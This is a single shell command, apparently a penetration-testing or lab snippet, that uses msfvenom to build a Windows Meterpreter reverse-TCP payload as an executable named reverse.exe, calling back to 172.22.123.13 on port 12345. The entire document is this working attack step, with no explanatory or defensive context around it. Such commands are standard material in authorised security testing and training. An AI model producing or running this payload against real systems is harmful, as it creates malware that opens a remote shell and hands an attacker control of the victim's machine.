 msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.22.123.13 LPORT=12345 -f exe > reverse.exe
